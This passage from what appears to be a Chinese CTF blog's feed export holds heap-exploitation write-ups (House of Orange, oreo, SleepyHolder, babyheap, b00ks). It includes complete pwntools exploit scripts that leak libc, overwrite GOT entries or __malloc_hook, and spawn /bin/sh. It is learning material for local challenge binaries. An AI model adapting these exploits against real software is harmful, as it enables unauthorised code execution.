&quot;/bin/sh&quot;；又因为为了将这个chunk放入smallbin 0x60，所以将size位设置为0x61。1fake_file = '/bin/sh\x00' + p64(0x61)然后将bk的位置写入(IO_list_all - 0x10，用作unsorted attack1fake_file += p64(0) + p64(IO_list_all - 0x10)接下来的位置刚好是_IO_write_base和IO_write_ptr。前面提到过需要构造fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base1fake_file += p64(0) + p64(1) #_IO_write_base ; _IO_write_ptr接下来需要一段padding，直至fp-&gt;mode1fake_file = fake_file.ljust(0xc0, '\x00') #padding抵达fp-&gt;mode，构造fp-&gt;_mode &lt;= 01fake_file += p64(0) #mode &lt;= 0然后需要设置vtable指针，将它设置到当前地址相邻往后的地址，然后继续在后面构造vtable就行了123payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针构造vtable12payload += p64(0)*3 #vtablepayload += p64(system) #将__overflow改为system写入数据1upgrade(0x800, payload)触发漏洞12p.recvuntil('Your choice : ')p.sendline('1')调用build函数，由最初的分析可知，此处会申请3个chunk。申请第一个chunk时，大小为0x20，因为fastbin中没有chunk，所以会进入大循环，将我们前面构造好的chunk放入smallbin 0x60。在从unsorted bin中取出这个chunk时，又会触发unsortedbin attack，改写_IO_list_all指针。至此，所有数据都布置好了。因为unsortedbin attack的时候破坏了unsorted bin的链表结构，所以接下来的分配过程会出现错误，系统调用malloc_printerr去打印错误信息，从而被我们劫持流程，执行到system函数。EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#-*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'bash', '-c']p = process('./house_of_orange')elf = ELF('./house_of_orange')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def build(size, name): p.recvuntil('Your choice : ') p.sendline('1') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name :') p.send(name) p.recvuntil('Price of Orange:') p.sendline('8') p.recvuntil('Color of Orange:') p.sendline('1')def see(): p.recvuntil('Your choice : ') p.sendline('2')def upgrade(size, name): p.recvuntil('Your choice : ') p.sendline('3') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name:') p.send(name) p.recvuntil('Price of Orange: ') p.sendline('8') p.recvuntil('Color of Orange: ') p.sendline('1')build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)#将topchunk放入unsortedbinbuild(0x1000, 'aaaa')#从unsortedbin中取出一部分topchunkbuild(0x400, 'a'*0x8)see()p.recvuntil('aaaaaaaa')libc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3C2DC8print "libc_base : %#x" % libc_base upgrade(0x400, 'a'*0x10)see()p.recvuntil('a'*0x10)heap_addr = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0xc0print "heap_addr : %#x" % heap_addrsystem = libc_base + libc.symbols['system']IO_list_all = libc_base + libc.symbols['_IO_list_all']print "system : %#x" % systemprint "_IO_list_all : %#x" % IO_list_allpayload = 'a' * 0x400 #paddingpayload += p64(0) + p64(0x21) #paddingpayload += p32(1) + p32(0x1f) + p64(0) #paddingfake_file = '/bin/sh\x00' + p64(0x61) # fp; sizefake_file += p64(0) + p64(IO_list_all - 0x10) # fd; bkfake_file += p64(0) + p64(1) # _IO_write_base ; _IO_write_ptrfake_file = fake_file.ljust(0xc0, '\x00') #paddingfake_file += p64(0) # mode &lt;= 0payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针payload += p64(0)*3 # vtablepayload += p64(system) # 将__overflow改为systemupgrade(0x800, payload)gdb.attach(p)p.recvuntil('Your choice : ')p.sendline('1')p.interactive()程序链接house of orange后记这篇文章写得是真的乱233333在写好exp后，运行最后会报memory corruption，我还以为出错了，又调了半天_(:зゝ∠)_，最后才反应过来程序本来就要调用malloc_printerr。。。默默输了个ls，看到回显感动得一匹。话说这exp有一定概率会失败，并不清楚原因_(:зゝ∠)_。]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>IO_FILE</tag>
        <tag>house_of_orange</tag>
        <tag>unsortedbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hack.lu2014-oreo writeup]]></title>
    <url>%2Fpost%2F1b661c73.html</url>
    <content type="text"><![CDATA[题目描述题目来源：hack.lu CTF 2014知识点：house of spirit挺老的一道题目了，不过是how2heap和ctfwiki上的例题。题目是一个买卖枪支的系统，同样是常规的增删查改，32位程序。12345678910Welcome to the OREO Original Rifle Ecommerce Online System!What would you like to do?1. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!Action:保护如下：123456[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos; Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序概况add函数：12345678910111213v1 = head;head = (char *)malloc(56u);if ( head )&#123; *((_DWORD *)head + 13) = v1; printf("Rifle name: "); fgets(head + 25, 56, stdin); sub_80485EC(head + 25); printf("Rifle description: "); fgets(head, 56, stdin); sub_80485EC(head); ++cnt;&#125;函数会读取名称和描述，并将名称、描述以及上一个枪支的地址一起存入结构体中，构成一个链表结构。结构体如下：1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 description db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ?00000038 rifle ends同时注意到，fgets函数读取的长度为56个字节，所以可以发生溢出。show函数：123456for ( i = head; i; i = (rifle *)i-&gt;next )&#123; printf("Name: %s\n", i-&gt;name); printf("Description: %s\n", i); puts("===================================");&#125;通过链表依次访问每个枪支，输出名称和描述。Free函数(Order)：遍历链表，依次将所有枪支都free掉，然后将链表头置0message函数：向dword_804A2A8指向的地址写入字符串。而在程序开头dword_804A2A8 = (char *)&amp;unk_804A2C0;，所以是向unk_804A2C0处写入。1234567.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h.bss:0804A2C0 unk_804A2C0 db ? ; ; DATA XREF: main+29↑o.bss:0804A2C1 db ? ;.bss:0804A2C2 db ? ;.bss:0804A2C3 db ? ;漏洞分析泄露libc基址因为程序通过链表来管理枪支，恰好在枪支结构体中存在溢出，所以可以通过从name溢出到next指针，将next修改到任意地址，再通过show就可以任意地址读了。这里可以通过泄露puts_got,然后通过偏移来算出libc基址。house of spirit因为可以控制next指针，也就意味着可以在任意地方free，那么可以构造house of spirit。如果可以在massage指针dword_804A2A8处布置好一个fake chunk用于绕过free的检查，那么就可以在此处分配一个chunk，massage指针将会被控制，从而实现任意地址写。构造fake chunk若要让dword_804A2A8在chunk内部，首先需要在它的上方构造出这个chunk的size，可以发现，在对枪支进行计数的cnt变量刚好在0x804A2A4的位置，所以只需要添加一定数量的枪支，就可以达到我们想要的size。12345678.bss:0804A2A0 dword_804A2A0 dd ? ; DATA XREF: Free+5A↑r.bss:0804A2A0 ; Free+62↑w ....bss:0804A2A4 cnt dd ? ; DATA XREF: add+C5↑r.bss:0804A2A4 ; add+CD↑w ....bss:0804A2A8 ; char *dword_804A2A8.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h因为一个枪支结构体的大小为0x38，加上chunk header后的size属于0x40这个fast bin，所以需要将fake chunk的size设置为0x40，也就是添加0x40个枪支然后需要绕过对next chunk的检查，通过写入message，将对应next chunk的size和prevsize都构造好。（详见exp）构造好后：1234560x804a288: 0x00000000 0x00000000 0x00000000 0x000000000x804a298: 0x00000000 0x00000000 0x00000001 0x00000041 &lt;== size0x804a2a8: 0x0804a2c0 0x00000000 0x00000000 0x00000000 &lt;== message指针0x804a2b8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2c8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2d8: 0x00000000 0x00000000 0x00000040 0x00000050 &lt;== prevsize size实现任意地址写在fake chunk构造好后，就可以将dword_804A2A8写入next指针，然后free，在message指针处构造好的fake chunk将会进入fast bin。重新添加枪支，fake chunk将会从bins中取出，通过设置枪支的description，就可以修改massage指针了，此时在调用message函数就能实现任意地址写注意程序中没有setvbuf，所以不会及时的回显数据，在编写exp时有些时候不用recvexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./hack-lu2014_oreo')elf = ELF('./hack-lu2014_oreo')libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')def add(name, description): p.sendline('1') p.sendline(name) p.sendline(description)def show(): p.sendline('2') p.recvuntil('=\n')def free(): p.sendline('3')def leaveMsg(msg): p.sendline('4') p.sendline(msg)def leak(addr): add('a'*27 + p32(addr), 'a') show() p.recvuntil('Description: ') p.recvuntil('Description: ') res = u32(p.recvuntil('\n', drop=True)[:4]) p.recvuntil('\n') return res#泄露libclibc_base = leak(elf.got['puts']) - libc.symbols['puts']system = libc_base + libc.symbols['system']print "libc_base : %#x" % libc_baseprint "system : %#x" % system#添加0x40个枪支，构造size位for _ in range(0x40-1): add('a', 'a')#将massage指针的地址写到next指针中add('a'*27 + p32(0x0804A2A8), 'a')#构造next chunk，将prevsize设为0x40，size设为0x50payload = '\x00'*0x20 + p32(0x40) + p32(0x50)leaveMsg(payload)#把fake chunk放入fast binfree()p.recvuntil('Okay order submitted!\n')#重新把fake chunk分配出来，并在description写入strlen_got，相当于将message指针改为指向strlen的got表add('a' ,p32(elf.got['strlen']))#写入message，相当于向strlen_got中写入system。#因为在leaveMsg函数中，fgets之后就会调用strlen，所以顺便就可以getshell了#这里使用分号是因为linux命令中可以使用';'来分割两条指令，所以这里相当于把/bin/sh当做第二条执行的指令了，而第一个p32(system)是个无效指令罢了leaveMsg(p32(system) + ';/bin/sh')p.interactive()相关链接题目链接：oreowriteup参考：ctfwiki]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>堆利用</tag>
        <tag>house_of_spirit</tag>
        <tag>ctfwiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2016-SleepyHolder writeup]]></title>
    <url>%2Fpost%2Fe99b1303.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。123456Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1.Keep secret2.Wipe secret3.Renew secret程序保护如下123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序概况keep函数：1234What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever根据选择不同的secret申请不同大小的内存，分别是40、4000、400000个字节。其中每个大小的chunk只能申请一次。wipe函数：12345678910if ( v0 == 1 )&#123; free(buf); dword_6020E0 = 0;&#125;else if ( v0 == 2 )&#123; free(qword_6020C0); dword_6020D8 = 0;&#125;只能删除small和big两种secret。free之后没有清空指针，存在double free漏洞renew函数：同样只能重写small和big两种secret，因为会检查是否使用的标记，所以不能UAF漏洞分析double free因为free之后没有清空指针，所以可以造成double free漏洞。这里double free可以用于辅助unlink。修改inuse位依次分配small和big两个secret，然后释放掉small secret，small secret将进入fast bin。此时再申请large secret。由于这是一个large chunk，会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin，不能合并的就直接放到unsortedbin，这样的目的是减少堆中的碎片。所以small secret将会进入unsorted bin，于此同时，big secret的inuse位也将会被置0。再次释放small secret。因为之前释放的small secret已经不在fast bin中，所以此时不会被检测到double free。申请small secret。从fast bin中取回small secret。这样就达到了修改inuse位的目的unlink前提知识：由于堆块的复用机制，当前一个chunk还在被使用时，后一个chunk的prevsize是归属于前一chunk，作为前一个chunk的数据区域。程序中，small secret的大小为0x28，刚好可以利用到下一个chunk的prevsize。如下：12345670x6032e0: 0x0000000000000000 0x0000000000000031 &lt;== small secret0x6032f0: 0x6161616161616161 0x61616161616161610x603300: 0x6161616161616161 0x61616161616161610x603310: **0x0a61616161616161** 0x0000000000000fb1 &lt;== big secret0x603320: 0x6262626262626262 0x62626262626262620x603330: 0x6262626262626262 0x62626262626262620x603340: 0x6262626262626262 0x000000000000000a所以可以通过double free来改变big secret的inuse位，又可以控制big secret的prevsize，且堆指针是全局变量，可以成功实现unlink。漏洞利用按照前文方法修改inuse位在small secret构造一个fake chunk，并修改big chunk的prevsize释放big secret，触发unlink通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址算出system的地址，并将其写入free_got调用free，成功getshell我的exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./SleepyHolder')elf = ELF('./SleepyHolder')libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')def add(index, content): p.recvuntil('3. Renew secret\n') p.sendline('1') p.recvuntil('\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content) def delete(index): p.recvuntil('3. Renew secret\n') p.sendline('2') p.recvuntil('2. Big secret\n') p.send(str(index))def update(index, content): p.recvuntil('3. Renew secret\n') p.sendline('3') p.recvuntil('2. Big secret\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content)#分配chunk1 chunk2add(1, 'a'*0x10)add(2, 'b'*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, 'c'*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got['free']atoi_got = elf.got['atoi']puts_got = elf.got['puts']puts = elf.symbols['puts']system_off = libc.symbols['system']atoi_off = libc.symbols['atoi']#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + '\x00\x00') - atoi_off#通过调试发现，这里只能取6个字节print "libc_base : %#x" % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, '/bin/sh\x00')delete(2)p.interactive()相关链接题目链接：SleepyHolderexp参考：how2heap、https://blog.csdn.net/qq_33528164/article/details/80040197]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>堆利用</tag>
        <tag>double_free</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之fastbin attack]]></title>
    <url>%2Fpost%2F531412d5.html</url>
    <content type="text"><![CDATA[原理fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制。相关源码：malloc：123456789101112131415161718/* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) &#123; // 得到对应的fastbin的下标 idx = fastbin_index(nb); // 得到对应的fastbin的头指针 mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; // 利用fd遍历对应的bin内是否有空闲的chunk块， do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); ...这里首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表指针，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里catomic_compare_and_exchange_val_acq是使用了lock-free的技术实现单向链表删除第一个node的操作，暂时不必关注。可以注意到，这里是通过fd指针来获取下一个chunk的。所以如果可以控制某个fast bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在任意地方分配chunk的目的。但是这里需要绕过一个检查:12345678910111213// 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; ...&#125;malloc会检查取到的chunk的size是否是符合这个fast bin的，若是不符合则会GG。所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。巧妙的是，因为此处没有对内存进行对齐检查，所以可以通过错位的方式来构造出一个假的size出来（详见文末相关题目）利用前提存在堆溢出、UAF等可以控制堆块内容（fd指针）的漏洞漏洞发生于fast chunk可以在目标位置构造出合适的size来绕过检查利用过程在想要分配的目标内存附近找到或者利用错位构造一个合适的size，用于绕过检查释放掉victim（fast chunk）通过从上一个chunk溢出或UAf等方式修改victim的fd指针，使fd指针指向构造好size的目标chunk通过两次分配，得到目标chunk题目0CTF 2017 babyheap]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf2017-babyheap writeup]]></title>
    <url>%2Fpost%2F47331c36.html</url>
    <content type="text"><![CDATA[题目描述题目来源：0CTF 2017知识点：fastbin attack，chunk overlap题目是一个内存管理系统，能增删查改。1234567===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand:题目是64位程序，开启保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled程序概况Allocate函数：12345678910111213141516171819202122232425262728void __fastcall Allocate(__int64 a1)&#123; signed int i; // [rsp+10h] [rbp-10h] signed int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(_DWORD *)(24LL * i + a1) ) &#123; printf("Size: "); v2 = get_num(); if ( v2 &gt; 0 ) &#123; if ( v2 &gt; 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf("Allocate Index %d\n", (unsigned int)i); &#125; return; &#125; &#125;&#125;限制chunk最大为4096，使用calloc意味着分配时会将chunk中的内容清0。最后将数据存入结构体1234500000000 chunk struc ; (sizeof=0x18, mappedto_6)00000000 inuse dq ?00000008 length dq ?00000010 ptr dq ?00000018 chunk endsFill函数：1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf("Index: "); result = get_num(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf("Size: "); result = get_num(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf("Content: "); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125;发现此处没有对size进行限制，存在溢出。并且，sub_11B2这个读取字符串的函数没有在字符串末尾加上&#39;\x00&#39;Free函数中将堆块释放，并将指针清0，没有什么问题。dump函数将指定索引的堆块内容输出漏洞分析泄露libc基址（chunk overlap）因为在small bin中只有一个chunk时，这个chunk的fd和bk将指向libc中某个地址（&amp;main_arena+88）,所以只要能够输出fd或者bk，就能泄露出libc的基址。123456780x555555757000 PREV_INUSE &#123; prev_size = 0, size = 209, fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, &lt;== libc中的地址 bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;问题的关键转移到如何输出fd和bk。因为存在堆溢出，那么可以通过从chunk0溢出到chunk1，修改chunk1的size，使size变大从而造成overlap，让chunk2的头部包含在chunk1中，然后就可以通过打印chunk1来泄露libc了fastbin attack先将chunk1释放，通过从chunk0溢出到chunk1的fd，通过控制chunk1的fd，则可以在几乎任意地方分配chunk。因为程序开启PIE和RELRO，所以没办法利用got表，则考虑malloc_hook或者free_hook等。这里需要考虑一个问题，在从fast bin分配chunk时，会检查取到的chunk大小是否与相应的fastbin索引一致（源码如下），也就是说若要在某个地方分配chunk，需要先在这个地方构造好size，使这个size恰好属于chunk所在的fastbin。1234567891011 // 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125;巧妙的是，在malloc_hook的前面，有类似这样的数据:1230x7ffff7dd3720 &lt;__memalign_hook&gt;: 0x00007ffff7a94fc0 0x00000000000000000x7ffff7dd3730 &lt;__realloc_hook&gt;: 0x00007ffff7a94f60 0x00000000000000000x7ffff7dd3740 &lt;__malloc_hook&gt;: 0x00007ffff7a94f20 0x0000000000000000又因为这里并没有对齐检测，所以可以通过利用没有对齐的数据来通过检测。通过截取上面数据的7f，和后面的00拼在一起，变成:1230x7ffff7dd371d: 0xfff7a94fc0000000 0x000000000000007f0x7ffff7dd372d: 0xfff7a94f60000000 0x000000000000007f0x7ffff7dd373d: 0xfff7a94f20000000 0x000000000000007f这样就构造出了一个size为0x7f的chunk。这样就可以在这分配一个大小为0x7f的chunk，然后从这写入，覆盖一定的无效数据就能到达malloc_hook的地址，然后向malloc_hook中写入one_gadget就可以getshell了。（了解one_gadget）漏洞利用分配两个chunk,大小分别为0x60和0x40（第二个chunk较小是为了之后能够改大，而又不超过fastbin限制）从chunk0溢出到chunk1的size，将其改成0x70，使chunk1覆盖的范围变大。但此时还并没有真正变大，要释放后重新分配出来才能生效。再分配两个chunk，chunk2需要是small chunk，chunk3是用来隔开top chunk，防止释放chunk2时被top chunk合并。因为在free的时候会检查下一个chunk的size是否大于2*size_sz并且小于system_mem（源码如下），所以还要在chunk2中构造一个fake size12345678910// 下一个chunk的大小nextsize = chunksize(nextchunk);// next chunk size valid check// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者// nextsize是否大于系统可提供的内存if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout;&#125;将chunk1释放，并重新分配一个大小0x60的chunk，这里chunk1被取回并成功扩大。因为使用的calloc会初始化内存，所以还需要恢复一下chunk2的前20个字节释放chunk2，chunk2进入small bin打印chunk1，泄露出libc的基址通过libc基址计算出malloc_hook的地址和one_gadget的地址释放掉chunk1，通过溢出chunk0来修改chunk1的fd，将fd修改到malloc_hook附近通过两次分配，得到malloc_hook附近的chunk向malloc_hook中写入one_gadget，成功getshellexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding:utf-8 -*-from pwn import *p = process('./0ctfbabyheap')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Allocate(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def Fill(index, content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content) + 1)) p.recvuntil('Content: ') p.sendline(content)def Free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def Dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: \n') data = p.recvline() return datadef leak_libc(): Allocate(0x60) #0 Allocate(0x40) #1 #从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大 payload = 'a'*0x60 + p64(0) + p64(0x71) Fill(0, payload) #分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并 #该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区 #接下来要将chunk1释放掉再分配使chunk1范围真正扩大 #但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem #所以还得构造一下next size Allocate(0x100) #2 Allocate(0x60) #3 payload = 'a'*0x10 + p64(0) + p64(0x71) Fill(2, payload) #释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空 #恢复smallchunk的前0x20个字节 Free(1) Allocate(0x60) #1 payload = 'a'*0x40 + p64(0) + p64(0x111) Fill(1, payload) #释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时 #该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中 #所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base Free(2) leaked = u64(Dump(1)[-9:-1]) - 0x3C27B8 print "libc_base : %#x" % (leaked) return leakeddef fastbin_attack(libc_base): #malloc_hook 可以在gdb中 x/32gx (long long)(&amp;main_arena)-0x40 来找到 malloc_hook = libc_base + libc.symbols['__malloc_hook'] #使用 one_gadget 找到execve('/bin/sh') execve_addr = libc_base + 0x4647c print "malloc_hook : %#x" % malloc_hook print "execve_addr : %#x" % execve_addr #释放掉chunk1 通过溢出chunk0来修改chunk1的fd #通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook #因为malloc会检查fastbin中chunk的size是否属于这个fastbin #而malloc_hook处的值为0 不能通过检查 #通过前文提到的未对齐的数据来绕过检查 #这样就可以获得一个size位为0x7f的chunk Free(1) payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0) Fill(0, payload) #通过两次分配 得到malloc_hook附近的chunk Allocate(0x60) Allocate(0x60) #覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr payload = p8(0)*3 + p64(execve_addr) Fill(2, payload) #malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell Allocate(0x60)libc_base = leak_libc()fastbin_attack(libc_base)p.interactive()相关链接题目链接：0ctf_babyheapwriteup参考：Anciety师傅的博客]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>堆利用</tag>
        <tag>ctfwiki</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Asis2016-b00ks writeup]]></title>
    <url>%2Fpost%2Fb6745c59.html</url>
    <content type="text"><![CDATA[题目描述题目来源：Asis CTF 2016知识点：null byte off_by_one、mmap泄露libc基址题目是一个书籍管理系统，具有增删查改功能。1234567891011nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks Welcome to ASISCTF book libraryEnter author name: aaaa1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt;题目是64位程序，开启保护情况：123456[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled程序开启了PIE，意味着难以得到程序中函数的地址，可能对泄露libc造成阻碍。程序概况程序首先要求输入author name，调用一个处理输入的函数（input函数）123456789101112131415161718192021signed __int64 __fastcall input(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\n' ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125;分析代码可以发现，代码对字符串末尾处理不当，会在字符串的最后加上&#39;\x00&#39;,即使字符串已经占满buf。也就是说程序中存在null byte off_by_one漏洞create函数:输入name，对大小没有限制1234567printf("\nEnter book name size: ", *&amp;v1); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 ) &#123; printf("Enter book name (Max 32 chars): 